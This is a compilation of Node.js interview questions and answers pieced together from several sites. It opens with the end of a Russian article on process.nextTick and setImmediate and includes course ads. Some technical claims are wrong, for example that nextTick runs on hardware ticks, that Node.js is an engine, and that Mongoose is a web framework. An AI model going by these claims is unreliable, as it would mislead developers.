setImmediate(() => {
  console.log('immediate');
});
В противном случае таймеры будут выполняться непредсказуемо. Ниже результат двух запусков таймеров:

Immediate
Timeout


Timeout
Immediate


5 В чем разница между process.nextTick() и setImmediate()
В этой ситуации всегда первым выполняется process.nextTick(), он выполняется при следующем тике (tick) ядра вашего компьютера, а это 100-1000 тиков в секунду — и в этом его опасность.

Если вы написали рекурсивную функцию и там есть process.nextTick(), то текущий цикл Event Loop так может и не завершиться, об этом есть предостережение в официальной документации.



6 Какие трудности можно решить с помощью process.nextTick()
Есть такие ситуации, когда нам нужно выполнить нашу функцию с минимальной задержкой только после того, как код будет инициализирован, но еще ни одна I/O-операция еще не будет выполнена, и здесь process.nextTick() поможет нам с легкостью:

const EventEmitter = require('events');

class MyEmitter extends EventEmitter {
  constructor() {
    super();

    process.nextTick(() => {
      this.emit('event');
    });
  }
}

const myEmitter = new MyEmitter();
myEmitter.on('event', () => {
  console.log('an event occurred!');
});
Этот пример кода из официальной документации, и очень простой, но он понятно и кратко показывает нам, какую важную проблему мы можем решить:

const EventEmitter = require('events');

class MyEmitter extends EventEmitter {
  constructor() {
    super();
    this.emit('event');
  }
}

const myEmitter = new MyEmitter();
myEmitter.on('event', () => {
  console.log('an event occurred!');
});
Если исключить process.nextTick() из нашего примера, то событие event никогда не сработает, потому что вызов произошел еще в конструкторе класса MyEmitter, а регистрация события — позже.



Вывод
Если говорить про опыт, то у меня были кандидаты из других стран, которые на вопрос «что такое Event Loop» отвечали так: «Зачем вы задаете мне такой элементарный вопрос, я человек с опытом 5+ лет, и клиент за такие знания не платит, он платит за фичи».

Конечно, все платят за функционал, только вот интересно, сколько будет потрачено времени и каким будет качество кода, если ты не знаешь, как все работает и какая сила в наших руках.

Знание таких вещей как фазы и работа с ними помогает нам понимать более проблемные места в коде, писать код осмысленно и решать более нетривиальные задачи без «костылей», что влияет на надежность и уверенность в работе нашей системы.

Благодарю вас за внимание и продуктивного кодинга 😉

NodeJS Interview Questions and Answers
Published On: June 10, 2024
Introduction
Being proficient in Node.js is essential in building fast, scalable, and data-intensive network applications. This article, which contains Node.js interview questions and answers, will walk you through the core concepts of Node.js, which include the Event Loop, Non-blocking I/O, Middlewares, and Package Management with NPM. Being proficient in Node.js will allow you to build high-performance backend applications, making you an essential resource in today’s fast-paced full-stack or backend development teams.

Want to become a certified backend developer? Want to master server-side JavaScript? Enroll in our professional Nodejs Certification Course in Chennai today and start building high-speed, scalable web applications.

List of NodeJS Interview Questions for Freshers
What is Node.js?
What does a JavaScript first-class function mean?
How do you handle packages in Node.js?
Why is Node.js single-threaded?
What is a callback in Node.js?
In what sense would you define I/O?
What is the use of the module “.Exports”?
Which database is used with Node.js more frequently?
Which Node.js command is used to import external libraries?
What does a Node.js event loop do?
How may a basic Express.js application be made?
What does Node.js’ REPL mean?

Check your knowledge level with our smart Knowledge Assessment Tool
Instant skill evaluation with accurate scoring
Identify strengths and learning gaps easily
Designed for students and working professionals
Smart assessment to guide your career growth
Take Your Eligibility Report Instantly

Current Experience Level

Technical Skill Level

Communication Level

Aptitude Level

Do You have IT Training Certificate?
Your Name
Your Mobile Number

Submit
Get started with our NodeJS course syllabus.

NodeJS Interview Questions and Answers for Freshers
1. What is Node.js?
A JavaScript engine called Node.js runs JavaScript code outside of a browser. It is scalable and typically used to construct the application’s backend.

2. What does a JavaScript first-class function mean?
First-class functions are those that can be utilized just like any other variable. Numerous other programming languages are similar to this, such as JavaScript, Scala, Haskell, etc. 

Due to this function, a function can now return a higher-order function or be supplied as a parameter to a callback function. Commonly used higher-order functions are map() and filter().

3. How do you handle packages in Node.js?
Several package installers and their corresponding configuration files can handle it. Use yarn or npm for the most part. 

Both offer enhanced capabilities for managing environment-specific configurations that are available to practically all JavaScript libraries. 

We utilize package.json and package-lock.json to maintain versions of the libraries installed in a project so that migrating that application to a different environment won’t be a problem.

4. Why is Node.js single-threaded?
Node.js supports async processing using a single thread. Compared to the usual thread-based design, additional performance and scalability can be obtained by performing async processing on a single thread under typical web loads.

5. What is a callback in Node.js?
Once a task is completed, a callback function is triggered. It avoids blocking and permits the execution of other programs in the interim. Because Node.js is an asynchronous platform, callbacks are very important. Node’s APIs are all designed to support callbacks.

6. In what sense would you define I/O?
Any program, procedure, or apparatus that transports data to or from one medium to another is referred to as I/O.

A transfer is always an input into one medium and an output into another. A physical device, a network, or files inside a system can all serve as the medium.

7. What is the use of the module “.Exports”?
When transferring all pertinent functions into a single file, a module in Node.js can be used to parse all connected code into a single unit of code. A module can be exported together with its function, allowing it to be imported into another project with the necessary keyword.

8. Which database is used with Node.js more frequently?
The most popular database used with Node.js is MongoDB. It is a document-oriented, cross-platform, NoSQL database with simple scalability, high availability, and excellent performance.

9. Which Node.js command is used to import external libraries?
Utilizing the “require” command allows you to import external libraries. Using “var http=require (“HTTP”)” as an example, by using the HTTP variable, this will load the HTTP library and the single exported object.

10. What does a Node.js event loop do?
Asynchronous callbacks in Node.js are controlled via event loops. It is one of the most crucial environmental elements since it forms the basis of Node.js’s non-blocking input/output.

11. How may a basic Express.js application be made?
The request object, which has attributes for the request query text, parameters, body, HTTP headers, and more, represents the HTTP request.

When an Express application receives an HTTP request, it responds with an HTTP object. 

12. What does Node.js’ REPL mean?
“Read Eval Print Loop,” or REPL, is a symbol representing a computer environment. It is comparable to entering commands in a Unix/Linux shell or Windows console. The system then produces an output in response.

Develop your web development skills with our NodeJS tutorial for beginners.

List of NodeJS Interview Questions for Experienced
What kinds of HTTP requests are there?
What distinguishes synchronous from asynchronous functions?
How can you use Node.js to write Hello World?
Describe a few clustering techniques for Node.js.
Explain the various types of Node.js streams.
How can you use Node.js to read command-line arguments?
In Node.js, how are environment variables handled?
Describe the Redis module for Node.js.

Check your knowledge level with our smart Knowledge Assessment Tool -
Instant skill evaluation with accurate scoring
Identify strengths and learning gaps easily
Designed for students and working professionals
Smart assessment to guide your career growth
Take Your Eligibility Report Instantly

Current Experience Level

Technical Skill Level

Communication Level

Aptitude Level

Do You have IT Training Certificate?
Your Name
Your Mobile Number

Submit
Explore our NodeJS project ideas to learn more.

NodeJS Technical Interview Questions and Answers for Experienced
1. What kinds of HTTP requests are there?
A collection of request methods defined by HTTP is used to carry out specific tasks. Among the requested techniques are:

GET: Data retrieval method
POST: Typically used to modify the server’s status or responses
HEAD: Requests a response without including the response body, akin to the GET method.
DELETE: This command removes the specified resource.
2. What distinguishes synchronous from asynchronous functions?
Writing scalable Node.js applications requires the use of asynchronous functions, which permit other code to run concurrently with their own execution, while synchronous functions stop it until they are finished.

3. How can you use Node.js to write Hello World?
const http = require(‘http’);

// Create a server object

http.createServer(function (req, res) {

    res.write(‘Hello World!’); 

    res.end();

}).listen(3000);

Use the command line to launch this application, and the browser window will display the results. When a browser sends a request through http://localhost:3000/, this application prints Hello World in the browser.

4. Describe a few clustering techniques for Node.js.
Fork(): It splits the master process into a new child process. If the current process is master, the isMaster function returns true; otherwise, it returns false.
isWorker: It returns true if the process that is now running is a worker; otherwise, it returns false.
process: It gives back the global kid process.
send (): It transmits a message from the worker to the master or the other way around.
kill(): This function terminates the active worker.
5. Explain the various types of Node.js streams.
Readable Stream: A stream that allows you to receive and read data in an organized manner is known as a readable stream. You are not permitted to send anything, though. For instance, we can read a file’s contents using fs.createReadStream().
Writable Stream: A writeable stream allows you to transfer data in an ordered manner, but it prevents you from receiving it back. For instance, we can write data to a file using fs.createWriteStream().
Duplex Stream: A duplex stream may be written to and read from simultaneously. You can therefore send and receive data at the same time. For instance.TCP is used by this socket. 
Transform stream: As data is read, this stream is utilized to change or transform it. In essence, the converted stream is a duplex. For instance, gzip is used to compress the data using zlib.createGzip stream.
6. How can you use Node.js to read command-line arguments?
When an application is executing through the operating system’s command line interface, it can receive additional information from a program via strings of text known as command-line arguments (CLI). 

The global object in the node, or the process object, makes it simple for us to read these arguments. Here’s how it works:

Step 1: Save a file as index.js, then open it and insert the code below.

let arguments = process.argv ;   

console.log(arguments) ;

Step 2: Use the following command to launch the index.js file:

node index.js 

7. In Node.js, how are environment variables handled?
Environment variables in Node.js are controlled by process.env. Keys and environment configurations that we can supply are contained in the.env file.

The syntax “process.env.VARIABLE_NAME” is used to access the variable within the application. To utilize it, use the following command to install the dotenv package:

npm install dotenv

8. Describe the Redis module for Node.js.
An open-source data structure storage system is called Redis. It can be used in numerous ways. It performs the roles of message broker, database, and cache. 
Data structures like strings, hashes, sets, sorted sets, bitmaps, indexes, and streams can all be stored in it. 
Redis is a great tool for Node.js developers since it minimizes cache size, which improves application performance. Still, Redis integration with Node.js apps is rather simple.

Node JS Senior Developer Interview Questions and Answers
Last updated by Vartika Rai on Sep 22, 2025 at 07:00 PM
| Reading Time: 7 minutes
Node.js is an open-source, cross-platform, single-threaded, backend JavaScript runtime environment and library. Node.js executes the JavaScript code outside the client’s web browser and runs on the V8 engine. Since it is single-threaded, Node.js is mainly used for non-blocking, event-driven servers.

Due to its asynchronous and event-driven model, we can use Node.js to create server-side data-intensive applications. We can also use it for developing distributed systems, general-purpose, real-time, and network applications. This article focuses on top Node JS interview questions to help you prepare better, no matter what your level of experience.

Node JS
DevOps School
If you are preparing for a tech interview, check out our technical interview checklist, interview questions page, and salary negotiation ebook to get interview-ready! Also, read Amazon Coding Interview Questions, Facebook Coding Interview Questions, and Google Coding Interview Questions for specific insights and guidance on coding interview preparation.

In this article, we present the NodeJS interview questions and answers. These are divided into basic, intermediate, and advanced levels.

Sample Node JS Interview Questions and Answers
Node JS
Snaphunt
1. How does Node.js handle child threads?
Node.js indeed spawns child threads for some tasks like asynchronous I/O. However, they run behind the scenes without executing any JavaScript code in the application and without blocking the main event loop.

Node.js is a single-threaded process that does not expose thread management methods and child threads to the developer. However, some tools enable threading support in a Node.js application, like the ChildProcess module. Node.js 12 also offers experimental support for threads.

2. What is the control flow function, and what does control flow do?
The control flow function is a function, a block of code, that runs in between several asynchronous function calls. The control flow controls the order of execution, collects information, limits concurrency, and calls the next step in a program.

3. Why is Node.js Single-threaded? Is Node.js synchronous or asynchronous?
Node.js is asynchronous and is single-threaded to enable async processing. Async processing on a single thread under usual web loads allows us to achieve more performance and scalability than the general thread-based implementation.

4. Why use Node.js?
Node.js is fast, asynchronous, rarely blocks, yields excellent concurrency, offers a unified language and data type, and eases the process of building scalable network programs.

5. List the various Node.js timing features.
setTimeout or clearTimeout, setInterval or clearInterval, and setImmediate or clearImmediate are three functions the Timers module provides for executing code after a specific period.

6. Name the two types of API functions in Node.js.
Asynchronous, non-blocking, and synchronous blocking functions are the two types of API functions in Node.js.

7. What does REPL stand for in Node.js?
REPL refers to Read, Eval, Print, and Loop in Node.js.

Basic Node JS Developer Interview Questions for Freshers


We start with some basic conceptual Node JS Developer interview questions you should be able to answer before we move ahead. Can you answer them?

Define and describe the usage of the following in the context of Node JS:

Event Emitter
Error-first callback
Callback hell
WASI
Reactor pattern
Buffer class
Timing features
Test pyramid
Package.json file
Reactor Pattern
Event Loop
Global installation of dependencies
NODE_ENV
LTS releases
Piping
Event-driven programming
Streams
Middleware
The module .Exports
Express.js package
REPL
Punycode
First class functions
Fork
Asynchronous API
NPM
Intermediate Node JS Developer Interview Questions For 2 Year Experience
Let’s move a step further with some intermediate Node JS Developer interview questions for experienced professionals:

Explain the web application architecture of Node.js.
Expand on the types of API functions available in Node.js.
What is usually the first argument passed to a Node.js callback handler?
Name some tools that help ensure consistent code style.
Expand on the various modules in Node.js.
Explain callback hell along with ways to avoid it.
Why is Node.js preferred over Java, PHP, and other backend technologies?
Explain the various types of HTTP requests.
How can we manage packages in a Node.js project.
State the advantages of using promises overusing callbacks.
Name and explain some of the flags used in file read/write operations.
Talk a bit about asynchronous, non-blocking APIs in Node.js.
Differentiate between the global and local installation of dependencies.
How would you create a simple server in Node.js that returns Hello World?
How would you create a simple Express.js application?
How would you install, update, and delete a dependency?
What does an EventEmitter do in Node.js?
Differentiate between readFile and createReadStream.
What does the TTY module in Node.js contain?
Differentiate between JavaScript, Angular, Ajax, and Node.js.
What is node js and what does it do? How would you install and update node js?
Does Node.js supports cryptography?
What does assert do in Node.js?
What does the control flow function do and how does it work?
Does Node.js come with a debugger?
What are the advantages and disadvantages of Node.js?
Can we access DOM in Node?
Name some of the most commonly used libraries in Node.js.
What kind of tasks we can do asynchronously using the event loop?
Name the command used to import external libraries.
Is evaluation of simple expressions possible using Node REPL?
Why is Node.js Single-threaded?
Which tool would you use to ensure consistent code style in Node.js?
What purpose does the underscore variable serve in REPL?
Advanced Node JS Senior Developer Interview Questions for 3-5 Years Experience
Lastly, here are some advanced Senior Node JS Developer interview questions. Ensure you can solve them before your interview:

How does Node prevent blocking code?
Why does Google use the V8 engine for Node.js?
How does Node.js handle concurrency, given it’s single-threaded?
How does Node.js support multi-processor platforms?
Does Node.js fully utilize all processor resources? If yes, how?
Why do we need to separate the Express app and server?
Explain config file separation for dev and prod environments via an example.
Describe how to use a URL module in Node.js.
Differentiate between process.nextTick() and setImmediate().
Differentiate between fork() and spawn() methods in Node.js.
Differentiate between Angular and Node.js.
What method would you prefer for resolving unhandled exceptions in Node.js?
How would you implement async in Node.js? Explain the use of async await using an example.
How does clustering improve the performance in Node.js?
How does the threadpool work and which library in Node.js takes care of it?
FAQs on Node JS
Q1. What should a senior Node.js developer know?

A senior Node.js developer should have experience in front-end design and development using HTML and CSS. And a senior Node.js developer must know all crucial JavaScript concepts, have error-handling skills, and need to have RESTful APIs and API communications skills.

Q2. Name a database popularly used with Node.js.

MongoDB is a cross-platform, NoSQL, document-oriented database most commonly used with Node.js. Its advantages include high availability, high performance, and ease of scalability.

Q3. Is Node.js free to use?

Yes, Node.js is free to use and released under MIT license.

Q4. Is Node.js single-threaded or multi-threaded? Is it asynchronous or synchronous?

Node.js is a single-threaded, asynchronous process.

Q5. How is Node.js most frequently used?

We use Node.js most frequently in IoT, Complex SPAs, real-time chats, real-time collaboration tools, microservices architecture, and streaming applications.

Ready to Nail Your Next Coding Interview?
Whether you’re a coding engineer gunning for a software developer or software engineer role, a tech lead, or targeting management positions at top companies, IK offers courses specifically designed for your needs to help you with your technical interview preparation!

If you’re looking for guidance and help with getting started, sign up for our FREE webinar. As pioneers in technical interview preparation, we have trained thousands of software engineers to crack the most challenging coding interviews and land jobs at their dream companies, such as Google, Facebook, Apple, Netflix, Amazon, and more!

Q1. Create a sleep function using Async/Await.
In the below example, the sleep function returns a promise which is resolved after given millisecond using setTimeout API.



Q2. How Javascript Engine works?
When a js file is ran,

A global execution context is created.

A memory heap is created where all variables (with var keyword) and functions (except arrow func) are declared.

In the below image we can see, variable a is declared w/o even execution has started.
image

A Call Stack is created which stores the line which is going to be executed.
image

When call stack gets a function call, it creates a functional context and the process is repeated in the functional context.

When call stack encounters WEB APIs like setTimeout/Interval/Immediate, these are sent to callback queue to process after call stack is empty.

When call stack encounters a Promise it is sent to micro task queue (higher priority than callback queue) to process after call stack is empty.

Once call stack is empty, event loop moves functions from queues to call stack for execution.

Q3. Difference between Single Threaded & Asynchronous.
My View:
Single Threaded -> It means only once function can be executed at a time.
Async -> It is about non-blocking of execution of functions.

In this below image, we can easily understand the difference. Thanks to Baeldung

Q4. How to debug a slow API?
My View:

The Console.log approach
Check if the issue is with network by sending request from different network.
Log time when req is received by the backend.
Log time before a DB query.
Log time after a DB query.
Log time before/after some heavy operation.
Log time before sending response.
Analyse the time, you will get your culprit.
Profiler Approach
Use any profiling tool to check where the execution is lagging.

What is EventEmitter in NodeJS?
My View: EventEmitter is used to create event listeners in JS.

Node.js Interview Questions and Answers For Freshers
Start with the fundamentals: core Node.js concepts, basic modules, and how asynchronous JavaScript works. These interview questions in Node.js help you build a strong base before moving to Express, APIs, and real-world use cases.

1. What is Node.js, and where can you use it?
Node.js is an open-source, cross-platform JavaScript runtime environment and library to run web applications outside the client’s browser. It is used to create server-side web applications.

Node.js is perfect for data-intensive applications as it uses an asynchronous, event-driven model. You can use  I/O-intensive web applications, such as video streaming sites. You can also use it to develop real-time web applications, Network applications, General-purpose applications, and distributed systems.

2. Why use Node.js?
Node.js makes it easy to build scalable network programs. Some of its advantages include:

It is generally fast
It rarely blocks
It offers a unified programming language and data type
Everything is asynchronous 
It yields great concurrency
3. How does Node.js work?
Node.js uses an event-driven, non-blocking I/O approach to handle work efficiently. When a request comes in, the event loop handles it. If something time-consuming comes up, such as reading a file or running cryptographic operations, that task is sent to a background thread managed by libuv.

Once it’s done, the result is pushed back to the queue and processed without stopping the main thread. Because of this setup, Node.js can handle a large number of requests simultaneously without slowing down.

4. Why is Node.js single-threaded?
Node.js uses a single main thread to execute JavaScript, keeping execution predictable and lightweight. However, it is not limited to one thread overall.

Heavy tasks such as file I/O, DNS lookups, and cryptographic operations are handled by background threads via libuv, and CPU-intensive work can be offloaded using worker threads when needed.

5. If Node.js is single-threaded, then how does it handle concurrency?
Node.js handles concurrency using the event loop and async APIs. Rather than spinning up a new thread for each request, it registers callbacks or promises and moves on to other work.

When an async task finishes, the event loop picks it up and processes the result. That’s how Node.js can deal with thousands of connections at the same time without falling over.

6. Explain callback in Node.js.
A callback function is called after a given task. It allows other code to be run in the meantime and prevents any blocking.  Being an asynchronous platform, Node.js heavily relies on callback. All APIs of Node are written to support callbacks.

7. What are the advantages of using promises instead of callbacks?
Promises provide a cleaner and more structured way to handle asynchronous operations
They avoid deeply nested callbacks, make error handling more predictable using .catch(), and work seamlessly with async/await syntax
Promises improve readability, debugging, and maintainability in modern Node.js applications
8. How would you define the term I/O? 
The term I/O is used to describe any program, operation, or device that transfers data to or from a medium and to or from another medium
Every transfer is an output from one medium and an input into another. The medium can be a physical device, network, or files within a system
9. How is Node.js most frequently used?
Node.js is widely used in the following applications:

Real-time chats
Internet of Things
Complex SPAs (Single-Page Applications)
Real-time collaboration tools
Streaming applications
Microservices architecture
10. Explain the difference between frontend and backend development?
Front-end

Back-end

Frontend refers to the client-side of an application

Backend refers to the server-side of an application

It is the part of a web application that users can see and interact with

It constitutes everything that happens behind the scenes

It typically includes everything that attributes to the visual aspects of a web application

It generally includes a web server that communicates with a database to serve requests

HTML, CSS, JavaScript, AngularJS, and ReactJS are some of the essentials of frontend development

Java, PHP, Python, and Node.js are some of the backend development technologies

11. What is NPM?
NPM stands for Node Package Manager, which manages all packages and modules for Node.js.

Node Package Manager provides two main functionalities:

Provides online repositories for Node.js packages/modules, which are searchable on search.nodejs.org
Provides a command-line utility to install Node.js packages and also manages Node.js versions and dependencies
12. What are the modules in Node.js?
Modules are like JavaScript libraries that can be used in a Node.js application to include a set of functions. To include a module in a Node.js application, use the require() function with the parentheses containing the module's name.

Node.js has many modules to provide the basic functionality needed for a web application. Some of them include:

Core Modules

Description

HTTP

Includes classes, methods, and events to create a Node.js HTTP server 

util

Includes utility functions useful for developers

fs

Includes events, classes, and methods to deal with file I/O operations

url

Includes methods for URL parsing

query string

Includes methods to work with the query string

stream

Includes methods to handle streaming data

zlib

Includes methods to compress or decompress files

13. What is the purpose of the module.exports?
In Node.js, a module encapsulates related code into a single unit that can be parsed by moving all relevant functions into a single file. You may export a module and its function, allowing it to be imported into another file with the needed keyword.

14. Why is Node.js preferred over other backend technologies like Java and PHP?
Node.js works well when you need to handle many requests without waiting on slow I/O. Its non-blocking model helps with that. Another plus is that you can use JavaScript on both the client and the server, which keeps things simple.

The npm ecosystem also makes it easy to pull in libraries and tools. That said, Node.js isn’t the best choice for everything. For heavy CPU work, languages like Java or PHP can still be a better fit.

15. What is the difference between Angular and Node.js?
Angular

Node.js

It is a frontend development framework

It is a server-side environment

It is written in TypeScript

It is written in C, C++ languages

Used for building single-page, client-side web applications

Used for building fast and scalable server-side networking applications

Splits a web application into MVC components

Generates database queries

Node.js has a solid presence on the web. According to W3Techs, Node.js is used by around 5.7% of all websites with a known web server technology, indicating steady adoption in production environments.

16. Which database is more popularly used with Node.js?
MongoDB is the most common database used with Node.js. It is a NoSQL, cross-platform, document-oriented database that provides high performance, high availability, and easy scalability.

17. What are some of the most commonly used libraries in Node.js?
There are two commonly used libraries in Node.js:

ExpressJS - Express is a flexible Node.js web application framework that provides a wide set of features to develop web and mobile applications.
Mongoose - Mongoose is also a Node.js web application framework that makes connecting an application to a database easy.
18. What are the pros and cons of Node.js?
Node.js offers fast execution, excellent scalability, and strong support for real-time applications. It uses JavaScript, which simplifies full-stack development, and has a mature ecosystem via npm.

On the downside, Node.js is not ideal for CPU-heavy tasks unless worker threads are used, and poorly written asynchronous code can still become hard to maintain.

19. What is the command used to import external libraries?
The “require” command is used for importing external libraries. For example - “var http=require (“HTTP”).”  This will load the HTTP library and the single exported object through the HTTP variable.

20. What are common security vulnerabilities in Node.js applications?
Node.js apps can face security issues, especially when handling user input, authentication, or API access. Most of these problems come from weak input checks, unsafe settings, or dependencies that haven’t been updated in a while.

Some of the most common security issues include:

Cross-site scripting (XSS)
Cross-site request forgery (CSRF)
SQL or NoSQL injection attacks
Insecure JWT handling
Improper CORS configuration
Advance Your Full Stack Career!AI-Powered Full Stack Developer ProgramEXPLORE COURSEAdvance Your Full Stack Career!
Node.js Interview Questions and Answers For Intermediate-Level
Level up with practical topics like the event loop, middleware, REST APIs, error handling, and performance basics. These Node.js developer interview questions and answers are ideal for candidates who’ve built projects and want to explain how Node.js works behind the scenes.

21. What does event-driven programming mean?
An event-driven programming approach uses events to trigger various functions. An event can be anything, such as typing a key or clicking a mouse button. A call-back function is already registered with the element executes whenever an event is triggered.

22. What is an Event Loop in Node.js?
Event loops handle asynchronous callbacks in Node.js. It is the foundation of Node.js's non-blocking input/output in Node.js, making it one of the most important environmental features.

23. Differentiate between process.nextTick() and setImmediate()?
process.nextTick() schedules a callback to run immediately after the current operation completes, before the event loop continues. setImmediate() schedules a callback to execute in the check phase of the next event loop iteration.

Overusing process.nextTick() can block the event loop, while setImmediate() is safer for deferring execution.

24. What is an EventEmitter in Node.js?
EventEmitter is a class that holds all the objects that can emit events
Whenever an object from the EventEmitter class throws an event, all attached functions are called upon synchronously
25. What are the two types of API functions in Node.js?
The two types of API functions in Node.js are:

Asynchronous, non-blocking functions
Synchronous, blocking functions
26. What is the package.json file?
The package.json file is the heart of a Node.js system. This file holds the metadata for a particular project. The package.json file is found in the root directory of any Node application or module.

This is what a package.json file looks like immediately after creating a Node.js project using the command: npm init

You can edit the parameters when you create a Node.js project.

27. How would you use a URL module in Node.js?
The URL module in Node.js provides various utilities for URL resolution and parsing. It is a built-in module that helps split up the web address into a readable format.

28. What is the Express.js package?
Express is a flexible Node.js web application framework that provides a wide set of features to develop both web and mobile applications.

29. How do you create a simple Express.js application?
The request object represents the HTTP request and has properties for the request query string, parameters, body, HTTP headers, and so on
The response object represents the HTTP response that an Express app sends when it receives an HTTP request
30. What are streams in Node.js?
Streams are objects that enable you to read data or write data continuously. There are four types of streams:

Readable: Used for reading operations
Writable: Used for write operations
Duplex: Can be used for both read and write operations
Transform: A type of duplex stream where the output is computed based on the input
31. How do you create a simple server in Node.js that returns Hello World?
Import the HTTP module
Use createServer function with a callback function using request and response as parameters
Type “hello world." 
Set the server to listen to port 8080 and assign an IP address
32. Explain asynchronous and non-blocking APIs in Node.js.
All Node.js library APIs are asynchronous, which means they are also non-blocking
A Node.js-based server never waits for an API to return data. Instead, it moves to the next API after calling it, and a notification mechanism from a Node.js event responds to the server for the previous API call
33. How do we implement async in Node.js?
The async code asks the JavaScript engine running the code to wait for the request.get() function to complete before moving on to the next line for execution.

34. What is a callback function in Node.js?
A callback is a function called after a given task. This prevents any blocking and enables other code to run in the meantime.

35. What is CORS, and why is it important in Node.js APIs?
CORS stands for Cross-Origin Resource Sharing. It controls which websites can access your API. Without proper CORS settings, your API could be accessed by unwanted or malicious origins.

In production environments, CORS should never be left open to all origins. Instead, it should be carefully restricted to trusted domains. This helps prevent unauthorized access and improves overall application security.

Node.js Interview Questions and Answers For Experienced Professionals
Dive into advanced system design, scalability, security, observability, and production-ready Node.js architecture. This extensive list of interview questions and answers on Node.js focus on decision-making, trade-offs, and leading real-world backend engineering work.

36. What is REPL in Node.js?
REPL stands for Read-Eval-Print-Loop, representing a computer environment. It’s similar to a Windows console or a Unix/Linux shell, where a command is entered. Then, the system responds with an output

repl2

37. What is the control flow function?
The control flow function is a code that runs between several asynchronous function calls.

38. What is the difference between fork() and spawn() methods in Node.js?
fork()

spawn()

	spawn
fork() is a particular case of spawn() that generates a new instance of a V8 engine.

Spawn() launches a new process with the available set of commands.

Multiple workers run on a single node code base for multiple tasks.

This method doesn’t generate a new V8 instance, and only a single copy of the node module is active on the processor.

39. What is the buffer class in Node.js?
The Buffer class stores raw data similar to an array of integers, but corresponds to a raw memory allocation outside the V8 heap. The Buffer class is used because pure JavaScript is not compatible with binary data.

40. What is piping in Node.js?
Piping is a mechanism for connecting the output of one stream to the input of another. It is normally used to retrieve data from one stream and pass output to another stream

41. What is a memory leak in a Node.js application, and how can you detect it?
A memory leak happens when a Node.js application keeps using memory that it no longer needs. Over time, this unused memory keeps growing, which can slow down the application or even cause it to crash. Memory leaks are more serious in Node.js because applications often run for long periods without restarting.

To understand whether a memory leak exists, developers usually start by observing memory usage patterns over time. If memory keeps increasing even when the workload remains the same, it is a strong sign of a leak. Developers then rely on profiling tools to investigate further.

Some common ways to detect memory leaks include:

Monitoring memory usage using process.memoryUsage()
Taking heap snapshots and comparing them to see which objects are growing
Using profiling tools to track retained objects and references
42. How do you fix memory leaks once they are identified?
Once a memory leak is found, the next step is to understand what is holding onto the memory. In many cases, the issue comes from references that are never released.

To fix memory leaks, developers usually focus on a few practical habits that make a real difference:

Remove event listeners, timers, or intervals that are no longer needed
Avoid keeping data in global variables unless it’s truly required
Keep in-memory caches small and clear them when possible
Ensure closures don’t retain references longer than necessary
Use streams for large data instead of loading everything into memory at once
43. What is callback hell?
Callback hell, also known as the pyramid of doom, is the result of intensively nested, unreadable, and unmanageable callbacks, which in turn makes the code harder to read and debug
improper implementation of the asynchronous logic causes callback hell
44. What is a reactor pattern in Node.js?
A reactor pattern is a design pattern for non-blocking I/O operations. This pattern provides a handler for each I/O operation. As soon as an I/O request is generated, it is then submitted to a demultiplexer.

45. How do you securely handle JWT authentication in Node.js?
JWTs are commonly used for authentication in Node.js applications, but they must be handled carefully. A JWT is only safe if it is properly signed, stored, and validated.

To secure JWT authentication, developers usually follow a few best practices:

Use strong secrets or private keys for signing tokens
Set expiration times to prevent long-lived tokens
Avoid storing sensitive data inside the token payload
Prefer HttpOnly cookies when security is critical
Always validate the token before trusting it
46. For Node.js, why does Google use the V8 engine?
Node.js is built on Google’s V8 engine. V8 uses Just-In-Time compilation to turn JavaScript into machine code, so things run fast. Memory handling is also efficient, which helps with performance. Since V8 behaves consistently across platforms, Node.js works well for large server-side applications.

47. How do you protect a Node.js application from CSRF attacks?
CSRF attacks happen when a user is tricked into doing something they didn’t mean to, like submitting a form or clicking a link. Apps that use cookies for authentication are usually the ones most at risk.

To protect against CSRF, developers usually combine multiple strategies:

Using CSRF tokens to verify requests
Setting cookie attributes like SameSite
Avoiding unsafe HTTP methods for sensitive actions
Using authorization headers instead of cookies where possible
48. Explain the concept of middleware in Node.js.
Middleware is a function that receives the request and response objects. Most tasks that the middleware functions perform are:  

Execute any code
Update or modify the request and the response objects
Finish the request-response cycle
Invoke the next middleware in the stack
49. What are the different types of HTTP requests?
HTTP defines a set of request methods for performing desired actions. The request methods include:

GET: Used to retrieve the data
POST: Generally used to make a change in state or reactions on the server
HEAD: Similar to the GET method, but asks for the response without the response body
DELETE: Used to delete the predetermined resource
50. How would you connect a MongoDB database to Node.js?
To create a database in MongoDB:

Start by creating a MongoClient object
Specify a connection URL with the correct IP address and the name of the database you want to create
Developer usage remains strong as well. The Stack Overflow Developer Survey reports that 40.8% of developers actively use Node.js, and 64.2% of those developers want to continue using it, highlighting high long-term confidence in the technology.

51. What testing tools are commonly used in Node.js projects?
Testing is an essential part of Node.js development. It helps ensure that applications behave correctly and remain stable as they grow.

Most Node.js projects rely on tools like Jest for unit and integration testing. Jest provides assertions, mocking, and test runners in a single package. For API testing, Supertest is commonly used to simulate HTTP requests and verify responses.

52. How do you test an API endpoint in Node.js?
When testing an API endpoint, developers usually start small, checking the logic piece by piece. Then they test the full request and response to make sure everything works as expected.

The typical testing process includes:

Writing unit tests for business logic
Using Supertest to test HTTP routes
Mocking databases or external services
Verifying both successful responses and error cases
53. What is the difference between unit testing and integration testing?
Unit testing is about testing small pieces of your code, such as individual functions or modules. These tests run fast and help catch logic mistakes early.

Integration testing looks at how different parts of your app work together, including routes, middleware, and databases. Both types of testing are useful for keeping Node.js applications reliable.

54. How would you design a scalable Node.js API?
Scalability is a key concern in system design interviews. A scalable Node.js API should handle increasing traffic without performance issues.

To achieve scalability, developers usually design APIs that are:

Stateless, so any server can handle requests
Load-balanced across multiple instances
Optimized with caching mechanisms
Protected with rate limiting
Designed to fail gracefully
55. How do you ensure high availability in Node.js systems?
In production, things break all the time. High availability is about designing the system so it keeps running anyway, without users feeling the impact.

Teams usually improve availability by doing a few key things:

Using load balancers
Monitoring service health
Isolating failures using microservices
Using message queues for asynchronous tasks
56. Why is logging important in Node.js applications?
Logging helps developers understand what is happening inside an application, especially in production. Without logs, debugging issues becomes very difficult.

Most Node.js applications use structured logging tools that record logs with timestamps and severity levels. These logs are often collected in centralized systems for easy analysis and alerting.

57. How do you monitor a Node.js application in production?
Monitoring is about keeping an eye on how an application behaves in real use. Teams usually monitor metrics such as response time, error rates, CPU load, and memory usage.

When these numbers start to look off, monitoring tools surface the issue and send alerts. That gives developers a chance to step in and fix problems before users notice anything.

58. What are the best practices for structuring a Node.js project?
A well-structured project is easier to maintain and scale. Features rather than file types usually organize Node.js projects.

A good project structure includes:

Separating routes, controllers, and services
Using environment variables for configuration
Centralized error handling
Keeping business logic separate from server setup
